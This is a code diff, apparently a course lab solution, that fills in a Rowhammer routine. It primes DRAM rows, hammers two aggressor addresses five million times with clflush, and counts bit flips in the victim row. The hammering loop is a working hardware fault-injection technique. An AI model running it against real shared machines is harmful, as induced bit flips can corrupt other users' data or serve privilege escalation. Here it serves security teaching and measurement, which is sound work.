@@ -12,6 +12,8 @@
 
 #define NUM_HAMMER_ATTEMPTS 100
 
+#define HAMMER_ROUNDS 5000000
+
 
 char *dram_to_str(uint64_t phys_ptr);
 
@@ -26,9 +28,38 @@ char *dram_to_str(uint64_t phys_ptr);
  *
  */
 uint64_t hammer_addresses(uint64_t vict, uint64_t attA, uint64_t attB, uint64_t hp_base) {
+    // hp_base = the base address of the huge page that contains the victim and aggressor rows.
                       
     uint64_t foundFlips = 0;
-    // TODO: Exercise 4-1
+    
+    // Prime the victim and aggressor rows: victim rows with 0 and aggressor rows with 1
+    // We are given PHYSICAL addresses
+    memset((void*)vict, VIC_DATA, HUGE_PAGE_SIZE);
+    memset((void*)attA, AGG_DATA, ROW_STRIDE);
+    memset((void*)attB, AGG_DATA, ROW_STRIDE);
+
+    // Hammer the two rows, repeatedly alternatively accessing two attack rows in DRAM 5 million times
+    // Ensure access always reaches DRAM by using clflush and rdtscp to create memory access patterns with high chances of causing rowhammer bit flips.
+    // Only need to access one address per row
+    for (int i = 0; i < HAMMER_ROUNDS; i++) {
+        clflush((void*)attA);
+        clflush((void*)attB);
+
+        // Access the two aggressor addresses back-to-back without memory fences in between
+        volatile char temp_A = *(volatile char*)attA;
+        volatile char temp_B = *(volatile char*)attB;
+    }
+
+    // Probe the victim row by comparing read results with 0
+    printf("[HAMMERING] Hammering victim at %s with aggressors at %s and %s\n", dram_to_str(vict), dram_to_str(attA), dram_to_str(attB));
+    for (size_t offset = 0; offset < ROW_STRIDE; offset++) {
+        volatile char *vict_addr = (volatile char *)(vict + offset);
+        if (*vict_addr != VIC_DATA) {
+            // printf("[FLIP] Victim address 0x%lx flipped from 0x%02x to 0x%02x\n", vict + offset, VIC_DATA, *vict_addr);
+            foundFlips++;
+        }
+    }
+
     return foundFlips; 
 }
 
@@ -115,6 +146,7 @@ int main(int argc, char** argv) {
         
 
         memset((void*)hp_base, VIC_DATA, HUGE_PAGE_SIZE);
+
 
         printf("[HAMMER] A: %s B: %s\n", dram_to_str(attA_phys), dram_to_str(attB_phys));
 
